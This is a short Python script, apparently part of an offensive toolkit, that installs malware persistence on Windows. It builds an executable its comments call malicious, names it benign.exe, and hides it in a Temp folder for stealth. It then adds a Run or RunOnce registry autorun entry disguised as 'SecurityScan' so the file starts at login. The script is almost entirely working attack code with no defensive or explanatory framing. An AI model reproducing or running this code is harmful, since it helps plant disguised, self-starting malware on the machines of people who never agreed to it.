import os, shutil, winreg

filedir = os.path.join(os.getcwd(),"Temp")              # PATH where we are hiding malicious exe file
filename = "benign.exe"
filepath = os.path.join(filedir,filename)

if os.path.isfile(filepath):
    os.remove(filepath)

# Use BuildExe to create malicious executable
os.system("python BuildExe.py")                         # to build an exe file from python script (refer USB_autorun_malicious.py)

# Move malicious executable to desired directory
shutil.move(filename,filedir)                           # moving malicious file to TEMP dir for stealth


# Windows default autorun keys: (These are the PATH to autorun files in regedit)
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

regkey = 1

if regkey < 2:
    reghive = winreg.HKEY_CURRENT_USER
else:
    reghive = winreg.HKEY_LOCAL_MACHINE
if (regkey % 2) == 0:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
else:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"


# Add registry autorun key
reg = winreg.ConnectRegistry(None,reghive)
key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)          # filepath is of malicious exe that will autorun